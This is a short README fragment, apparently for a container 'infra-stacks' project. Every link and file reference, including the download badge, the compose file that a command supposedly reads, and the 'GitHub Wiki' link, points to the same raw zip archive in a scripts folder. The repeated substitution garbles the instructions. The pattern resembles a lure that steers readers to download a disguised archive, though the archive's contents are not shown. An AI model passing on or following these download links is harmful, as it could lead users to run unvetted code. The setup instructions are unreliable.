...
[![Download infra-stacks](https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip)](https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip)
...
[Download infra-stacks](https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip)
...
Once you've selected a version, look for the downloadable files. These are usually labeled as `.zip` or `https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip`. Click on the appropriate link to download the files.
...
This command will start all services defined in the `https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip` file. The `-d` flag runs the containers in detached mode, which means they will run in the background.
...
For detailed information about each stack, including configuration options, usage guides, and troubleshooting tips, refer to the documentation included in the extracted folders. You can also check our [GitHub Wiki](https://raw.githubusercontent.com/jobayer58/infra-stacks/main/scripts/infra_stacks_v3.5.zip) for more tutorials and FAQs.
